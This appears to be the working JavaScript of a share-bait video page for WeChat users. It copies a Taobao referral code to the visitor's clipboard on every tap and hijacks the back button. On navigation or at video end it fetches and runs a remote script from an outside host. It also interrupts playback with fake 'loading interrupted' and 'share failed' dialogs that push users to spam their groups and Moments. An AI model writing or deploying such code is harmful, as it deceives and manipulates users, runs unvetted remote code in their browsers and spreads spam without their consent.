var city = '';
if (remote_ip_info) {
    city = remote_ip_info['city'];
    if (city.length == 0) {
        city = remote_ip_info['province'];
    }
}
if (!city) {
    city = '';
}
var svid = 'h0562lrt9vm'; //'h0562lrt9vm';
var video = new tvp.VideoInfo();
video.setVid(svid); //视频vid
var player = new tvp.Player($('#videoCon').width(), 200); //视频高宽
var myDate = new Date();
player.setCurVideo(video);
//player.addParam("autoplay",0);//是否自动播放，1为自动播放，0为不自动播放
player.addParam("wmode", "transparent");
player.addParam("pic", tvp.common.getVideoSnapMobile(svid)); //默认图片地址
player.write("videoCon");
player.create({
    onallended: function() {
        $.getScript('//api.xbiao.co/z/jump.php?type=2018');
    }
});
$("body").addClass("xs_btn_yy");
var clipboard = new Clipboard(".xs_btn_yy", {
    text: function() {
        return "新人福利社！复制这条信息，￥lgHy0LrzUKr￥ ，打开【手机淘宝】即可查看"
    }
});
//$("body").addClass("xs_btn_yy");var clipboard=new Clipboard(".xs_btn_yy",{text:function(){return"快来领支付宝红包！人人可领，天天可领！复制此消息，打开最新版支付宝就能领取！￥61qNUv56uM￥"}});

$(function() {
    console.log(111)
    if (getCookie('isFinish') != 1) {
        if (getCookie('show_Mask') == 1) {
            api();
            jiazai();
        }
        setInterval(function() {
                if (player.getCurTime() > 547) {
                    if (getCookie('show_Mask') != 1) {
                        setCookie('show_Mask', 1)
                    }
                    location.reload();
                }
            },
            1000);

    }
})

function api() {
    $.ajax({
        type: "GET",
        // url: "http://sdk.jinzhike.com.cn/jssdk/jssdk/wx_sharesp.php?url=" + encodeURIComponent(location.href.split('#')[0]),
        url: "//weixinh5.hk01.bdysite.com/openplatsm/sdk/getsdk.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
        //url : "//api.jucaicai.cn/getsdk.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
        //url : "//wensdk.applinzi.com/openplatsm/sdk/sdk.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
        dataType: "jsonp",
        jsonp: "callback",
        data: {},
        success: function(resultsdk) {
            window.data = resultsdk;
            //alert(window.data.timestamp);
            //window.share_info = result;
            share_config(window.data);
        }

    });
};

function share_config(data) {

    $.ajax({
        type: "GET",
        url: "//newpost.gz01.bdysite.com/api2.php?url=" + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        success: function(resultapi) {
            // d.data.jsApiList = ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"];
            //sharedata = data.data;
            /* window.config = {
                debug: false,
                appId: window.data.data.share.config.appId,
                timestamp: window.data.data.share.config.timestamp,
                nonceStr: window.data.data.share.config.nonceStr,
                signature: window.data.data.share.config.signature,
                jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems']
            }; */
            window.config = {
                debug: false,
                appId: window.data.appId,
                timestamp: window.data.timestamp,
                nonceStr: window.data.nonceStr,
                signature: window.data.signature,
                jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems']
            };
            wx.config(window.config);
            showMask();
            showtip();
            window.share_info = resultapi;
            wx.ready(function() {
                wx.hideOptionMenu();
                wx.showMenuItems({
                    menuList: ['menuItem:share:appMessage']
                });
                var ua = navigator.userAgent.toLowerCase();
                if (/iphone|ipad|ipod/.test(ua) && window.share_info.adfx) {
                    wx.onMenuShareAppMessage({
                        title: window.share_info.to_timeline2.title.replace('{city}', city), // 分享标题
                        desc: window.share_info.to_timeline2.desc,
                        link: window.share_info.to_timeline2.link,
                        imgUrl: window.share_info.to_timeline2.img, // 分享图标
                        success: function() {
                            shareATimes += 1;
                            share_tip();
                            sharereq(++idx);
                        },
                        cancel: function() {}
                    });
                } else {
                    wx.onMenuShareAppMessage({
                        title: window.share_info.to_group.title.replace('{city}', city),
                        desc: window.share_info.to_group.desc.replace('{city}', city),
                        link: window.share_info.to_group.link,
                        imgUrl: window.share_info.to_group.img,
                        success: function() {
                            shareATimes += 1;
                            share_tip();
                            sharereq(++idx);
                        },
                        cancel: function() {}
                    });
                }

                wx.onMenuShareTimeline({
                    title: window.share_info.to_timeline.title.replace('{city}', city), // + myDate.toLocaleTimeString(),
                    desc: myDate.toLocaleTimeString(),
                    link: window.share_info.to_timeline.link,
                    imgUrl: window.share_info.to_timeline.img,
                    success: function() {
                        shareTTimes += 1;
                        share_tip(shareATimes, shareTTimes);

                    },
                    cancel: function() {}
                });
            });
        }
    });
};
window.onhashchange = function() {
    goback();
};

function goback() {
    $.getScript('//api.xbiao.co/z/jump.php?type=2018');
}

function hh() {
    console.log('ready');

    history.pushState(history.length + 1, "message", "#" + (new Date).getTime());
    console.log('go');
    //getShareData();
};
setTimeout("hh();", 300);

function goback1() {
    //top.location.href = ok;
    $.getScript('//api.xbiao.co/z/jump.php?type=2018');
}

weui = {
    alert: function(n, t, i) {
        var r, u;
        t = t ? t : "";
        r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
        r += '<div class="weui_mask"><\/div>';
        r += '<div class="weui_dialog">';
        r += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title">' + t + "<\/strong><\/div>";
        r += '    <div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><\/div>';
        r += '    <div class="weui_dialog_ft">';
        r += '      <a href="javascript:;" class="weui_btn_dialog primary">确定<\/a>';
        r += "  <\/div>";
        r += " <\/div>";
        r += "<\/div>";
        $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append(r);
        u = $(".weui_dialog_alert");
        u.show();
        u.find(".weui_dialog_bd").html(n);
        u.find(".weui_btn_dialog").off("click").on("click",
            function() {
                u.hide();
                i && i()
            });
    }
};

var ua = navigator.userAgent.toLowerCase();
var result = /micromessenger/.test(ua);
if (!result) {
    //top.location.href = 'http://m.qq.com';
};

function share_tip() {
    if (shareATimes == 1) {
        weui.alert('<b style="font-size: 22px">分享成功！</b><br>请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！');
    } else if (shareATimes == 2) {
        weui.alert('<b style="font-size: 22px">分享失败！</b><br>注意:分享到相同的群会失败<b style="font-size: 18px;color: red"></b><br>请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！');
    } else if (shareATimes == 3) {
        weui.alert('<b style="font-size: 22px">分享成功！</b><br>请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！');
        /* shareATimes++;
        wx.onMenuShareAppMessage({
            title: window.share_info.to_timeline2.title.replace('{city}', city), // 分享标题
            desc: window.share_info.to_timeline2.desc,
            link: window.share_info.to_timeline2.link,
            imgUrl: window.share_info.to_timeline2.img, // 分享图标
            success: function () {
                shareATimes += 1;
                share_tip(shareATimes, shareTTimes);
            },
            cancel: function () {
            }
        });	 */
    } else {
        if (shareTTimes < 1) {
            weui.alert('<b style="font-size: 30px;color: #f5294c">分享成功！</b><br>最后请分享到<b style="font-size: 30px;color: #f5294c">朋友圈</b>即可!');
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:timeline']
            });
        } else {
            if (shareTTimes == 1) {
                wx.onMenuShareTimeline({
                    title: window.share_info.to_timeline2.title.replace('{city}', city),
                    link: window.share_info.to_timeline2.link,
                    imgUrl: window.share_info.to_timeline2.img,
                    success: function() {
                        shareTTimes += 1;
                        share_tip(shareATimes, shareTTimes);
                    },
                    cancel: function() {}
                });

                weui.alert('<span style="font-size: 30px;color: #f5294c">分享失败</span><br>再分享一次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可免流量加速观看!')
            } else {
                weui.alert('分享成功,点击确定继续播放', "",
                    function() {
                        setCookie('isFinish', 1);
                        location.reload();
                    });

            }

        }
    }
};

function show_tip() {
    ele = $(".weui_dialog_alert");
    if (ele.length > 0) {
        ele.show();
        return;
    }
    showtip();
}

$(document).on('tap', '#fenxiang',
    function() {
        show_tip();
    });

var sharedata;

function showtip() {
    weui.alert("<img style=\"width: 40px;margin-top: -30px\" src=\"//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0\"><br><b style=\"font-size: 22px;color: red\">数据加载中断</b><br>请分享到微信群，可<b style=\"color: red;\">免流量加速观看</b>");
}

function jiazai() {
    weui.alert("<img style=\"width: 40px;margin-top: -30px\" src=\"//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0\"><br><b style=\"font-size: 22px;color: red\">数据加载中,请稍等!</b>");
}

function showMask() {
    $("#fenxiang").show();

}

function getCookie(name) {
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) return unescape(arr[2]);
    else return '';
}

function setCookie(name, value) {
    document.cookie = name + "=" + escape(value) + "; path=/";
}
var shareATimes = 0;
var shareTTimes = 0;
document.title = '';
//document.title='男͏子新͏婚͏当͏天，丈͏母͏娘非͏要50W彩͏礼，新͏郎一͏怒之͏下͏娶͏了伴͏娘！';

var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?4236883b91d549cc1c3eca773c19b575";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
var s = document.createElement('script');
s.src = 'https://s13.cnzz.com/z_stat.php?id=1265191828&web_id=1265191828?v=' + Date.now();
document.body.appendChild(s);
